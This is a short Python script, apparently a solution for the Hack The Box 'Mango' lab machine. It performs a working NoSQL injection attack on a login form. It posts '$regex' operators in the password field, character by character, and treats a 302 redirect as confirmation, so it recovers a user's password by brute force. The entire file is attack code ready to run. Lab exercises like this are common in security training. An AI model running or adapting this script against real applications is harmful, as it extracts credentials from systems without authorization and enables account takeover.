#!/usr/bin/python3
# -*- coding: utf-8 -*-

from pwn import *
import pdb
import requests, string, re


def def_handler(sig, frame):
	print("\n[!]Saindo...\n")
	sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT,def_handler)

# Variables globals
main_url = "http://staging-order.mango.htb/"
characters = string.ascii_letters + string.digits + string.punctuation
# characters = "bcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def makeRequest():

	p1 = log.progress("Brute Force")
	p1.status("Start Brute Force")
	time.sleep(1)

	# p2 = log.progress("Username")
	# username = ""
	# username = "m"

	p2 = log.progress("Password[admin]")
	password = ""

	while True:
		for character in characters:

			p1.status(f"Verify character = {character}")

			# NoSQL Injection
			post_data = {
				# 'username[$regex]': f'^{username + character}',
				# 'username': 'admin',
				'username': 'mango',
				'password[$regex]': f'^{re.escape(password + character)}',
				'login': 'login'
			}

			# pdb.set_trace()

			r = requests.post(main_url, data=post_data, allow_redirects=False)

			# pdb.set_trace()

			if r.status_code == 302:
				#username += character
				password += character
				# p2.status(username)
				p2.status(password)
				break

if __name__ == '__main__':
	makeRequest()
